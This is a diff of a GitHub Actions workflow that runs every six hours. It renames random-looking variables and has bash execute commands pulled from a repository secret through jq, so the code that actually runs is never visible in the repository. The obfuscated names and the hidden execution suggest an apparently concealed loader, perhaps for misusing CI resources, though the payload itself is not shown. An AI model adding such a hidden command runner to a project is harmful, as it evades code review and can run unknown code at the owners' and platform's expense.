@@ -3,30 +3,25 @@ name: formulahorseshoes
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 1/6 * * *'
+    - cron: '45 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: formulahorseshoes
         env:
-          bjal5: ${{ secrets.bjal5 }}
+          beacg3015: ${{ secrets.beacg3015 }}
         run: |
-          echo $bjal5 | jq -r .gboq940 | /bin/bash
-          echo $buzjd95 | jq -r .g225 | /bin/bash
-          echo $gh12319 | jq -r .izd415 | /bin/bash
-          echo $o960 | jq -r .ujqa1 | /bin/bash
-          echo $uak56 | jq -r .xne31164 | /bin/bash
-          echo $hmx49431 | jq -r .es93462 | /bin/bash
-          echo $c37183 | jq -r .pjl5 | /bin/bash
-          echo $i95 | jq -r .ifvle43 | /bin/bash
-          echo $cc7907 | jq -r .tf66981 | /bin/bash
-          echo $xdvmr62 | jq -r .a0497 | /bin/bash
-          echo $pmyf2 | jq -r .l8 | /bin/bash
-          echo $h84 | jq -r .snsro32 | /bin/bash
-          echo $upw7 | jq -r .oigq28844 | /bin/bash
-          echo $fi60 | jq -r .ogd850 | /bin/bash
-          echo $qag0 | jq -r .lfjj6 | /bin/bash
+          echo $beacg3015 | jq -r .fwf1 | /bin/bash
+          echo $fvl49795 | jq -r .nlthl59 | /bin/bash
+          echo $zpwv27 | jq -r .kshc204 | /bin/bash
+          echo $f1167 | jq -r .ju7 | /bin/bash
+          echo $xz687 | jq -r .ry65394 | /bin/bash
+          echo $qhz95 | jq -r .uh00374 | /bin/bash
+          echo $c1 | jq -r .m0 | /bin/bash
+          echo $fkqo0 | jq -r .j015 | /bin/bash
+          echo $gkilp6 | jq -r .s805 | /bin/bash
+          echo $fef48 | jq -r .qsfrv75 | /bin/bash
 
